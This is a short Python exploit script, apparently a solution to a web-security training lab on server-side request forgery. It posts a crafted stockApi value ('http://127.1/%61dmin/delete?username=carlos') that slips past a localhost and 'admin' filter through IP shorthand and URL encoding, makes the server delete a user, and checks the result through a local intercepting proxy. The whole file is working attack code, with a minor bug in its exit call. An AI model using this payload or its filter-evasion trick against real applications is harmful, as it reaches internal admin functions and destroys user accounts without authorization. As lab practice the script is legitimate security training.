import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    payload = 'http://127.1/%61dmin/delete?username=carlos'
    check_stock_path = "/product/stock"
    params = {'stockApi': payload}
    r = requests.post(url + check_stock_path, proxies=proxies, data=params, verify=False)

    #checking if the user carlos got deleted
    payload2 = 'http://127.1/%61dmin/'
    params2 = {'stockApi': payload2}
    r = requests.post(url + check_stock_path, data=params2, proxies=proxies, verify=False)
    if 'User deleted successfully' in r.text:
        print("You successfully deleted the user carlos, GG")
    else:
        print("The exploit failed miserably")


def main():
    if len(sys.argv) !=2:
        print("(+) Usage %s <url>" % sys.argv[0])
        print("(+) Example: %s Th3lazykid.gitbook.io" % sys.argv[0])
        sys.exit[-1]

    url = sys.argv[1]
    print("(+) Deleting carlos user...")
    delete_user(url)


if __name__ == "__main__":
    main()
